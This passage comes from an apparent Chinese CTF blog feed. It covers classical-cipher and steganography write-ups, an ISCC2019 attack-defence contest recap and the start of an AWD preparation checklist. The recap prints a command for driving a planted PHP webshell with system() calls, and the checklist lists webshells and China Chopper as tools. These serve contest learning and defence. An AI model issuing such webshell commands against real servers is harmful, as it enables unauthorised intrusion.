title="栅栏密码"></a>栅栏密码</h4><p>栅栏密码是一种简单的移动字符位置的加密方法，规则简单，容易破解。栅栏密码的加密方式：把文本按照一定的字数分成多个组，取每组第一个字连起来得到密文1，再取每组第二个字连起来得到密文2……最后把密文1、密文2……连成整段密文。例如：</p><p>明文：栅栏密码加密规则示例<br>每组字数：5</p><p>按照字数先把明文分成：<br>栅栏密码加<br>密规则示例</p><p>先取每组第一个字：栅密<br>再取每组第二个字：栏规<br>……</p><p>最后得到“栅密栏规密则码示加例”。</p><p>解密则反推：<br>密文被分成2个字一组：<br>栅密<br>栏规<br>密则<br>码示<br>加例</p><p>先取每组第一个字：栅栏密码加<br>再取每组第二个字：密规则示例</p><p>最后得到“栅栏密码加密规则示例”。</p><h4 id="凯撒密码"><a href="#凯撒密码" class="headerlink" title="凯撒密码"></a>凯撒密码</h4><p>凯撒密码最早由古罗马军事统帅盖乌斯·尤利乌斯·凯撒在军队中用来传递加密信息，故称凯撒密码。这是一种位移加密方式，只对26个字母进行位移替换加密，规则简单，容易破解。下面是位移1次的对比：</p><table><thead><tr><th>明文字母表</th><th>Z</th><th>A</th><th>B</th><th>C</th><th>D</th><th>E</th><th>F</th><th>G</th><th>H</th><th>I</th><th>J</th><th>K</th><th>L</th><th>M</th><th>N</th><th>O</th><th>P</th><th>Q</th><th>R</th><th>S</th><th>T</th><th>U</th><th>V</th><th>W</th><th>X</th><th>Y</th></tr></thead><tbody><tr><td>密文字母表</td><td>A</td><td>B</td><td>C</td><td>D</td><td>E</td><td>F</td><td>G</td><td>H</td><td>I</td><td>J</td><td>K</td><td>L</td><td>M</td><td>N</td><td>O</td><td>P</td><td>Q</td><td>R</td><td>S</td><td>T</td><td>U</td><td>V</td><td>W</td><td>X</td><td>Y</td><td>Z</td></tr></tbody></table><p>将明文字母表向后移动1位，A变成了B，B变成了C……，Z变成了A。同理，若将明文字母表向后移动3位：</p><table><thead><tr><th>明文字母表</th><th>X</th><th>Y</th><th>Z</th><th>A</th><th>B</th><th>C</th><th>D</th><th>E</th><th>F</th><th>G</th><th>H</th><th>I</th><th>J</th><th>K</th><th>L</th><th>M</th><th>N</th><th>O</th><th>P</th><th>Q</th><th>R</th><th>S</th><th>T</th><th>U</th><th>V</th><th>W</th></tr></thead><tbody><tr><td>密文字母表</td><td>A</td><td>B</td><td>C</td><td>D</td><td>E</td><td>F</td><td>G</td><td>H</td><td>I</td><td>J</td><td>K</td><td>L</td><td>M</td><td>N</td><td>O</td><td>P</td><td>Q</td><td>R</td><td>S</td><td>T</td><td>U</td><td>V</td><td>W</td><td>X</td><td>Y</td><td>Z</td></tr></tbody></table><p>则A变成了D，B变成了E……，Z变成了C。</p><p>字母表最多可以移动25位。凯撒密码的明文字母表向后或向前移动都是可以的，通常表述为向后移动，如果要向前移动1位，则等同于向后移动25位，位移选择为25即可。</p><p>下面开始做题</p><p>”困在栅栏里的凯撒“，应该是先栅栏解密，再凯撒解密。因为直接先凯撒好像没有规律。</p><p>想到最后结果开头应该是CTF或flag。所以栅栏解密时，花括号前有三个或四个字母</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvMTRmNzcyYTdiNmNjNzY4ZS5qcGc" alt></p><p>然后再凯撒解密</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvMzEyMGQ2NjJlYTIwMTczZC5qcGc" alt></p><p>得到flag了。。。。</p><h3 id="Crypto2：变异凯撒"><a href="#Crypto2：变异凯撒" class="headerlink" title="Crypto2：变异凯撒"></a>Crypto2：变异凯撒</h3><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvYmVlMzY5NmRkZWQ2MDM5OS5qcGc" alt></p><p>格式是flag{}，与密文的ASCII比较发现</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvNDdmMTZhZTBhNWYwNDM3NS5wbmc" alt></p><p>一步一步比较： flag{Caesar_variation}</p><p>这样就得到flag了。。</p><h3 id="Crypto3：密文-rot13"><a href="#Crypto3：密文-rot13" class="headerlink" title="Crypto3：密文 rot13"></a>Crypto3：密文 rot13</h3><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvNjEyYTEzMjA1OTVkODk4Ni5qcGc" alt></p><p>先了解一下</p><h4 id="rot13的相关知识"><a href="#rot13的相关知识" class="headerlink" title="rot13的相关知识"></a>rot13的相关知识</h4><p>ROT5、ROT13、ROT18、ROT47 编码是一种简单的码元位置顺序替换暗码。此类编码具有可逆性，可以自我解密，主要用于应对快速浏览，或者是机器的读取，而不让其理解其意。</p><p>ROT5 是 rotate by 5 places 的简写，意思是旋转5个位置，其它皆同。下面分别说说它们的编码方式：<br><strong>ROT5</strong>：只对数字进行编码，用当前数字往前数的第5个数字替换当前数字，例如当前为0，编码后变成5，当前为1，编码后变成6，以此类推顺序循环。<br><strong>ROT13</strong>：只对字母进行编码，用当前字母往前数的第13个字母替换当前字母，例如当前为A，编码后变成N，当前为B，编码后变成O，以此类推顺序循环。<br><strong>ROT18</strong>：这是一个异类，本来没有，它是将ROT5和ROT13组合在一起，为了好称呼，将其命名为ROT18。<br><strong>ROT47</strong>：对数字、字母、常用符号进行编码，按照它们的ASCII值进行位置替换，用当前字符ASCII值往前数的第47位对应字符替换当前字符，例如当前为小写字母z，编码后变成大写字母K，当前为数字0，编码后变成符号_。用于ROT47编码的字符其ASCII值范围是33－126，具体可参考<a href="http://www.qqxiuzi.cn/bianma/ascii.htm" target="_blank" rel="noopener">ASCII编码</a>。</p><p>于是rot13解码，得到最终结果</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvZDkzNzJlYmFhYzY1MDY3OS5qcGc" alt></p><h3 id="感悟"><a href="#感悟" class="headerlink" title="感悟"></a>感悟</h3><p>总结又使我收获好多，题比较基础，不过可以借此了解一下移位编码的基础知识。继续努力！！！</p><p>小白进阶ing。。。。。。。。。。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
            <tag> 移位编码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MISC-图片隐写</title>
      <link href="/2019/07/10/MISC-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/"/>
      <url>/2019/07/10/MISC-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/</url>
      
        <content type="html"><![CDATA[<h3 id="MISC1：Paint-amp-Scan"><a href="#MISC1：Paint-amp-Scan" class="headerlink" title="MISC1：Paint&amp;Scan"></a>MISC1：Paint&amp;Scan</h3><p>标题的意思是<strong>画图和扫描</strong></p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvNmE2YjRhOTlhYTY2YWRlMi5qcGc" alt></p><p>题目提示也是。下载题目文件并解压，得到txt文件。打开</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvYzE0MmI2YzkxY2U0Nzg1NC5qcGc" alt></p><p>很明显就是画图了。用到画图工具<strong>gnuplot</strong>。所以先替换，将坐标转换成gnuplot能识别的格式</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvMzE5MzAyNTJmY2Y2YzZmOC5qcGc" alt></p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvODFlYjIzODI5NDE1ZWM1MS5qcGc" alt></p><p>然后开始画图，画图命令<code>plot &quot;Paint&amp;Scan.txt&quot;</code></p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvYzgzMGIxNDcwMDk0NjQyYy5qcGc" alt></p><p>画出了张二维码</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvNmU2MDNhNmY4NDA5MjczNS5qcGc" alt></p><p>二维码扫一下，得到flag</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvYmE4ZjlmOThmZTdlMTRkOS5qcGc" alt></p><h3 id="MISC2：九连环"><a href="#MISC2：九连环" class="headerlink" title="MISC2：九连环"></a>MISC2：九连环</h3><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvNGZhMjViMjRkMGEyMzliNi5qcGc" alt></p><p>题目没有提示。打开链接保存jpg图片</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvNjEzYzFiNjM3MWQ1YjIzMy5qcGc" alt></p><p>binwalk分析一下</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvZDAxYzUxZmE2MGQ1ZDczYi5qcGc" alt></p><p>图片里隐藏了文件，foremost分离一下。为了方便，可以直接用winRAR打开jpg图片，并解压隐藏文件。</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvYTQ3MGFmNGEwNzgxNmY2Ni5qcGc" alt></p><p>有一个加密了。先看是不是伪加密</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvMjI1ZGMwZWZmZTg2Nzk3MC5qcGc" alt></p><p>是伪加密，把504B0102后第五、第六位0108改为0000，即可破解伪加密</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvYTgzYzhlYWVkZjg3Y2E2Ni5qcGc" alt></p><p>解压</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvOTA0ZWU3ZmY4NjVkMjVjNC5qcGc" alt></p><p>这应该是张jpg图片，用winHex查看果然是。加文件后缀<code>.jpg</code>，打开图片</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvZDQyYjg1NzYyMWQ4YTUyZS5qcGc" alt></p><p>没有有效信息，那看一下解压得到的qwe.zip压缩包，用winRAR打开</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvYTU3MWY0NmYxZDQ2ZGY5NS5qcGc" alt></p><p>发现加密的flag.txt文件。用winHex打开qwe.zip，发现并不是伪加密。好像进行不下去了，于是参考了下大牛的博客。发现要用到一个工具<strong>steghide</strong>。</p><p>用法：<code>steghide extract -sf picture.jpg</code></p><p>然后输入密码，没有密码则回车跳过</p><p>于是刚才那张图片就可以用到了</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvNjZkZjVlNDRmMGQyODU4Yi5qcGc" alt></p><p>得到一个ko.txt文件。打开，发现flag.txt文件的密码了，输入密码，打开flag.txt。得到flag</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvZWVhYjA1M2NhMjNmMDM3Zi5qcGc" alt></p><h3 id="MISC3：欢迎来到地狱"><a href="#MISC3：欢迎来到地狱" class="headerlink" title="MISC3：欢迎来到地狱"></a>MISC3：欢迎来到地狱</h3><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvMjFkZjE4ODMzMmJhNDAxMC5qcGc" alt></p><p>下载题目文件并解压</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvNjI4OWVhNWUzMzExN2VkZi5qcGc" alt></p><p>打开<strong>地狱伊始.jpg</strong></p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvOTYzMzNjOTJjYWNmMDAyZS5qcGc" alt></p><p>无法打开，用winHex查看一下文件格式，发现缺少文件头</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvYWU1NWI5MDc1NjdlZWNmZS5qcGc" alt></p><p>jpg图片的文件头是FFD8FF，添加文件头</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvYzA2Y2E3NThjMjM2YmUyYy5qcGc" alt></p><p>保存图片并打开</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvZDFiNDhjNGFmZDBhN2Q0Yi5qcGc" alt></p><p>图片里有个百度云盘链接，输入浏览器打开</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvYmVmNWI3ZDhlZDFjNTE5OC5qcGc" alt></p><p>下载wav音频文件，播放，发现比较有规律。应该是音频隐写了。使用音频分析工具Audacity打开wav文件，然后</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvOWZiMDg0ZWFjNjU1N2M0MS5qcGc" alt></p><p>发现大致有三种波形。想到了摩斯电码，于是将不同波形转换成摩斯电码</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvODUzNGRjNTVmODg3NDNhMy5qcGc" alt></p><p>摩斯电码解密得到</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvMWUyMDYxZWEzYThlZDg5Yi5qcGc" alt></p><p>打开<strong>第二层地狱.docx</strong>，发现被加密了。上面应该就是密码了，有点坑的是密码小写，即letusgo</p><p>打开之后，选择显示隐藏文字</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvNjRmYWZiNWRjZTQ1NGM1ZS5qcGc" alt></p><p>发现</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvNzkzYjUwOGU3Y2RiZDk4OS5qcGc" alt></p><p>image steganography(图片隐写术)</p><p>解密网站：<a href="https://www.atool.org/steganography.php" target="_blank" rel="noopener">https://www.atool.org/steganography.php</a></p><p>所以保存word文档里的图片，用上面网站解密</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvN2E3YmJlNDFkNWNiYWM2NS5qcGc" alt></p><p>这应该就是<strong>快到终点了.zip</strong>的解压密码了</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvYWJhOGJiZjA0NDgxMTg2NS5qcGc" alt></p><p>同理解压<strong>地狱大门.jpg</strong></p><p>打开<strong>最后一层地狱.txt</strong></p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvOTRjOTQ5ZTlkYzIxYWNmNy5qcGc" alt></p><p>8位二进制一组，二进制转ASCII码</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvZDkxYzQ2NDVkMTU1Yjc4Ni5qcGc" alt></p><p>发现解密结果是：弱口令</p><p>将<strong>地狱大门.jpg</strong>用winRAR打开，发现txt加密文件。并不是伪加密，应该就是上边提示的是弱口令。改<strong>地狱大门.jpg</strong>后缀为<strong>.zip</strong>，用Ziperello和弱口令字典破解得</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvZGU2NWYzZjJiNzM5MWIxMi5qcGc" alt></p><p>输入密码解压txt文件，并打开</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvYWFiZmVmZmRjM2VkMWNmZi5qcGc" alt></p><p>很明显Base64解码</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvMmJmMTRhYjhjOWFmOWJmZi5qcGc" alt></p><p>继续转</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvY2E0OWQxZGY1ZTJiMmI1Zi5qcGc" alt></p><p>发现Salted，应该就是所谓的“加盐”了</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvYjY4YmY0Y2VmNTc3NjI3YS5qcGc" alt></p><p>试了之后发现是加密算法是Rabbit</p><p>看到明文，结合txt文件里“凯撒家族”和“sixfour”，应该要凯撒解密,且偏移量可能是10或6或4。为了方便，我直接找到解密所有结果的</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvN2I2MGViYjViOTc3NDBlOS5qcGc" alt></p><p>得到flag了。</p><p>做了三道题，总结完毕。<br>小白进阶ing</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> MISC </tag>
            
            <tag> 隐写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ISCC2019线下赛总结</title>
      <link href="/2019/06/24/ISCC2019%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93/"/>
      <url>/2019/06/24/ISCC2019%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>今年的ISCC线下赛，完美结束了。这是我第一次参加ctf线下赛，同时非常有幸能够参加这次竞赛。在比赛中又学到了好多知识。于是现在按照惯例，当然是总结一下了。。。。。。</p><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>整个赛程分为：上午的选择题、ctf题和下午的攻防赛。</p><p>上午的选择题，大部分是去年的原题。ctf题感觉有点难度，不过前两道，也是原题。</p><p>在下午赛程中几乎被大佬们吊打。在大佬打我们的私地1的时候，我们还没做出自己私地1的题，也意味着我们还没拿到自己的第一个靶机。。。再次显示出我很菜很菜。</p><h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>看着分不断往下掉。心理非常慌，不断查百度、google，找到了非常类似的题，队友复现一波，我们终于有机会拿到自己队的第一个靶机。</p><h4 id="1、获得ssh"><a href="#1、获得ssh" class="headerlink" title="1、获得ssh"></a>1、获得ssh</h4><p>私地1：<a href="https://cloud.tencent.com/developer/article/1345742" target="_blank" rel="noopener">私地1解题详情</a>。</p><p>私地2：私机二是高端口，可以扫出来是12580。然而，第二个靶机我们并没拿到，后期被打的很惨。。。。</p><h4 id="2、登录连接ssh"><a href="#2、登录连接ssh" class="headerlink" title="2、登录连接ssh"></a>2、登录连接ssh</h4><p>意想不到的是，拿到ssh账号和密码后，竟没有第一时间登陆上，而又刚好开始了新的一轮，以至于我们再次掉分。</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvMzJmNjhmMGNjODMyOWYwOC5qcGc" alt></p><p>主要是上面这个，当我意外的把“密码”改成“Keybord Interactive”的时候，登上了，但是当时不知道为什么，毕竟第一次参加线下赛。于是我现在查了一下原因，发现：</p><ul><li><strong>基于口令的验证方式</strong>（password authentication method），通过输入用户名和密码的方式进行远程机器的登录验证。<br><strong>基于公共密钥的安全验证方式</strong>（public key authentication method），通过生成一组密钥（public key/private key）来实现用户的登录验证。<br><strong>基于键盘交互的验证方式</strong>（keyboard interactive authentication method），通过服务器向客户端发送提示信息，然后由客户端根据相应的信息通过手工输入的方式发还给服务器端。</li></ul><h4 id="3、修补防御"><a href="#3、修补防御" class="headerlink" title="3、修补防御"></a>3、修补防御</h4><p>在登陆上ssh账号和密码后。我们做的第一件事情就是备份！备份！备份！</p><p>然后如果某次遇到弱口令，一定要改ssh密码，我还不会改。。。。</p><p>接下来，开启修补漏洞、删后门的工作l。</p><h5 id="1-WAF"><a href="#1-WAF" class="headerlink" title="1.WAF"></a>1.WAF</h5><p>我先上waf</p><p><strong>用法：</strong></p><p>将waf.php传到要包含的文件的目录</p><p>在所需要防护的页面加入代码<code>require_once(&#39;waf.php&#39;);</code>就可以做到页面防注入、跨站。</p><p>如果想整站防注，就在网站的一个公用文件中，如数据库链接文件config.inc.php中！添加<code>require_once(&#39;waf.php&#39;)</code>;来调用本代码</p><h5 id="2-文件监控"><a href="#2-文件监控" class="headerlink" title="2.文件监控"></a>2.文件监控</h5><p>学长赛前给了个脚本，但是作为十成十的小白，当时没有用，也不太会用。</p><p><strong>用法：</strong></p><pre><code class="python">jiankong.py /var/www/html</code></pre><p>网上也有很多文件监控脚本，也可以自己搜下。</p><h5 id="3-删后门"><a href="#3-删后门" class="headerlink" title="3.删后门"></a>3.删后门</h5><p>先用D盾扫了下，没发现后门。。。那手工检查下吧，emmmm。。。发现了好多后门，有点尴尬！然后我开始了删除大佬后门的操作，本来感觉一切都很顺利。然而，当队友看我删完后，他刷新一下，发现有两个删过的后门又出现了。。。试了几次依旧删不掉。猜想这俩应该就是不死马了。</p><p><strong>不死马的使用：</strong></p><pre><code class="php">URL+.index.php POST pass=Sn3rtf4ck9&amp;a=system(&#39;ipconfig&#39;);</code></pre><p>例如：</p><pre><code class="php">http://127.0.0.1/.index.phppost：pass=Sn3rtf4ck9&amp;a=system(&#39;ipconfig&#39;);</code></pre><p>我们被按的两个不死马如下：</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvMWM3NzIzZWU4ZDRhNTAwMC5qcGc" alt></p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvMTY0ZTIxOGVhOTYzMzg0NS5qcGc" alt></p><p>然而，我并没有删过不死马。于是看了赛前学长给我们的工具包，发现解除不死马的文件了。</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvNDc4NjBjZjg2MTM4NmQxNS5qcGc" alt></p><p>emmmmm。。。。发现并不会用。作为小白的我，有点蓝瘦。亡羊补牢一下吧，现在开始学习了解一下：</p><p><strong>解除不死马：</strong></p><p>方法一：找工作人员重置私地虚拟机（听说有三次机会）</p><p>方法二：写个脚本不断查杀</p><p>方法三：找到木马名字。找到创建，木马对应的进程。修改解除不死马.php</p><h4 id="4、日志分析"><a href="#4、日志分析" class="headerlink" title="4、日志分析"></a>4、日志分析</h4><p>我忘了放上去了。。。。。。但这也是很重要的</p><p>1.感知可能正在发生的攻击，从而规避存在的安全风险</p><p>2.应急响应，还原攻击者的攻击路径，从而挽回已经造成的损失</p><p>记录log脚本</p><p>这种脚本网上有很多。</p><p><strong>脚本</strong></p><pre><code class="php">&lt;?phpdate_default_timezone_set(&#39;Asia/Shanghai&#39;);$ip = $_SERVER[&quot;REMOTE_ADDR&quot;]; //记录访问者的ip$filename = $_SERVER[&#39;PHP_SELF&#39;];//访问者要访问的文件名$parameter = $_SERVER[&quot;QUERY_STRING&quot;]; //访问者要请求的参数$time = date(&#39;Y-m-d H:i:s&#39;,time()); //访问时间$logadd = &#39;来访时间：&#39;.$time.&#39;--&gt;&#39;.&#39;访问链接：&#39;.&#39;http://&#39;.$ip.$filename.&#39;?&#39;.$parameter.&quot;rn&quot;;// log记录$fh = fopen(&quot;log.txt&quot;, &quot;a&quot;);fwrite($fh, $logadd);fclose($fh);?&gt;</code></pre><p><strong>日志分析工具</strong></p><p>1.LogForensics 腾讯实验室</p><p><em><a href="https://security.tencent.com/index.php/opensource/detail/15" target="_blank" rel="noopener">https://security.tencent.com/index.php/opensource/detail/15</a></em></p><p>2.北风飘然@金乌网络安全实验室</p><p><em><a href="https://www.freebuf.com/sectool/126698.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/126698.html</a></em></p><p>3.网络ID为piaox的安全从业人员：</p><p><em><a href="https://www.freebuf.com/sectool/110644.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/110644.html</a></em></p><p>4.网络ID：SecSky</p><p><em><a href="https://www.freebuf.com/sectool/8982.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/8982.html</a></em></p><p>5.网络ID：鬼魅羊羔</p><p><em><a href="http://www.freebuf.com/articles/web/96675.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/96675.html</a></em></p><h4 id="5、后门利用"><a href="#5、后门利用" class="headerlink" title="5、后门利用"></a>5、后门利用</h4><p>我们猜想其他很多人也应该有这个被按的不死马漏洞，那就利用一下吧。菜刀连一下，然而试了好多都没有连上。。。不知什么原因。也许是因为本小白太菜了。。。</p><h4 id="6、攻击"><a href="#6、攻击" class="headerlink" title="6、攻击"></a>6、攻击</h4><p>本小白太垃圾了，还没学会。会个SQL注入，结果好像也没用到。还有个一句话木马。</p><p>并且，连怎么攻击都不知道。。。。。。我果然够菜！</p><p><strong>漏洞类型</strong>：sqli居多、文件包含、各种rce、文件上传</p><h3 id="感悟"><a href="#感悟" class="headerlink" title="感悟"></a>感悟</h3><p>这次参加线下赛收获了好多关于线下赛的知识，体验了一次线下赛的感觉。游戏体验还行，两个私地，基本上防住了一个。遗憾的是，没有借此机会，认识一些大佬。。希望自己再接再励。。</p><p>小白进阶ing。。。。</p>]]></content>
      
      
      <categories>
          
          <category> 线下赛 </category>
          
          <category> AWD </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ISCC </tag>
            
            <tag> 感悟 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF线下赛AWD攻防准备</title>
      <link href="/2019/06/19/CTF%E7%BA%BF%E4%B8%8B%E8%B5%9BAWD%E6%94%BB%E9%98%B2%E5%87%86%E5%A4%87/"/>
      <url>/2019/06/19/CTF%E7%BA%BF%E4%B8%8B%E8%B5%9BAWD%E6%94%BB%E9%98%B2%E5%87%86%E5%A4%87/</url>
      
        <content type="html"><![CDATA[<p>最近发现一篇博客。感觉对CTF线下赛-AWD模式，总结比较好。于是学习了解了一下，为了方便寻找，把这篇博客复制了过来，并补充了点。。。</p><h3 id="1、赛制流程：攻防模式（AWD）常见于线下攻防"><a href="#1、赛制流程：攻防模式（AWD）常见于线下攻防" class="headerlink" title="1、赛制流程：攻防模式（AWD）常见于线下攻防"></a>1、赛制流程：攻防模式（AWD）常见于线下攻防</h3><p>一般比赛的具体环境会在开赛前半个小时由比赛主办方给出，前半个小时应熟悉配置环境。准备网线、网线转接口。</p><p><strong>最好的防御就是攻击，不做好安全加固就会被吊打。</strong></p><h3 id="2、-赛前准备："><a href="#2、-赛前准备：" class="headerlink" title="2、 赛前准备："></a>2、 赛前准备：</h3><h4 id="常用工具：-整理适合自己的"><a href="#常用工具：-整理适合自己的" class="headerlink" title="常用工具：(整理适合自己的)"></a>常用工具：(整理适合自己的)</h4><ul><li>Burpsuite</li><li>sqlmap</li><li>nmap、masscan</li><li>nc</li><li>D盾</li><li>Xshell、Xftp</li><li>菜刀或蚁剑</li><li>Chrome、Firefox各类插件</li></ul><p><strong>一句话木马：</strong></p><ul><li>php</li><li>asp</li><li>aspx</li><li>jsp</li><li>内存马</li></ul><p><strong>py库、脚本：</strong></p><ul><li>pwntools</li><li>requests</li><li>软waf</li><li>日志分析</li><li>Exp</li></ul><p><strong>SSH客户端：</strong></p><ul><li>PuTTY</li><li>XShell</li></ul><p><strong>编辑器：</strong></p><ul><li>Sublime</li><li>VS Code</li><li>Notepad++</li><li>Vim</li></ul><p><strong>个人知识库</strong></p><p><strong>常见应用源码库</strong></p><p><strong>Writeup集合</strong></p><h4 id="基础知识："><a href="#基础知识：" class="headerlink" title="基础知识："></a>基础知识：</h4><ul><li>语言运用：编写自动化脚本等……</li><li>WEB安全：熟悉常见漏洞类型、常见框架……</li><li>pwn型：需要较好的底层基础、懂汇编等，需要理解各种堆栈溢出的原理、基础密码学……</li><li>中间件：apache、nginx、tomcat、jboss、weblogic</li><li>语言基础：php、java、python</li><li>常见web应用：phpmyadmin、dedecms、phpcms、帝国cms、Discuz</li><li>linux命令：<code>netstat -tulpn</code> 、<code>ps -ef</code></li></ul><h4 id="Gamebox"><a href="#Gamebox" class="headerlink" title="Gamebox:"></a>Gamebox:</h4><ul><li><p>系统：ubuntu、centos</p></li><li><p>中间件、版本：</p><ul><li>apache \ nginx</li><li>php \ php-fpm</li><li>tomcat \ jboss \ weblogic</li></ul></li><li><p>web程序</p></li></ul><ul><li><p>数据库：</p><ul><li>MySQL \ MariaDB \ Oracle</li><li>Redis \ MongoDB</li></ul></li></ul><h3 id="3、常见加固方式："><a href="#3、常见加固方式：" class="headerlink" title="3、常见加固方式："></a>3、常见加固方式：</h3><h4 id="加固流程："><a href="#加固流程：" class="headerlink" title="加固流程："></a>加固流程：</h4><ol><li>修改网站管理员密码</li></ol><ol start="2"><li><p>备份网站源码</p><ul><li><code>tar -zcf /tmp/name.tar.gz /path/web</code></li><li><code>tar -zcf /tmp/name.tar.gz /var/www/html</code></li></ul></li><li><p>备份数据库</p><ul><li><code>mysqldump -u 用户名 -p 数据库名 &amp;gt; 导出的文件名</code></li><li><code>mysqldump -u user -p database &amp;gt; /tmp/database.sql</code></li></ul></li><li><p>修改ssh密码（即修改当前用户密码）</p></li><li><p>修改MySQL密码</p><ul><li><code>set password for 